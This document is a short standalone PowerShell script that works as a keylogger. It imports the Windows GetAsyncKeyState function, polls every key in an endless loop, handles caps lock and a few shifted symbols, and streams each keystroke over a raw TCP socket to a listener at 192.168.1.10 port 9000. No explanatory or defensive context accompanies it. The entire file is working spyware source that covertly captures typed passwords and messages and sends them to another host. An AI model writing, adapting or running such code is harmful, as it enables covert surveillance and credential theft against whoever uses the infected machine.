$signature = @'
[DllImport("user32.dll", CharSet=CharSet.Unicode, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
'@
$API = Add-Type -MemberDefinition $signature -Name 'Keypress' -Namespace API -PassThru
$caps_lock_state = $false;
$socket = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp);
$socket.Connect("192.168.1.10",9000);
function sendKeyStroke($sock, $char){
        if ($sock.Connected){
            $bytesSent = $sock.Send([text.Encoding]::Ascii.GetBytes($char));
        if ( $bytesSent -eq -1 ){
            Write-Output ("Send failed to " + $sock.RemoteEndPoint);
        }
    }
}
while ($true) {
    $shiftState = $API::GetAsyncKeyState(16)
    foreach ($asciiCode in 0..255) {
        $keyState = $API::GetAsyncKeyState($asciiCode)
        if ($keyState -eq -32767) {
            if($asciiCode -eq 20){$caps_lock_state = !$caps_lock_state;}
            if (!$caps_lock_state){
                if ($asciiCode -ge 65 -and $asciiCode -le 90) {$asciiCode += 32;}
            }
            if ($shiftState -eq -32767 ) {
                if ($asciiCode -eq 49){
                    sendKeyStroke $socket '!';
                }
                elseif($asciiCode -eq 50){
                    sendKeyStroke $socket '@';
                }
                elseif($asciiCode -eq 51){
                    sendKeyStroke $socket '#';
                }
            }else{
                if($asciiCode -eq 190){
                    sendKeyStroke $socket '.';
                }else{
                    $keyChar = [char]$asciiCode;
                    sendKeyStroke $socket $keyChar;
                }
            }
        }

    }
    Start-Sleep -Milliseconds 40
}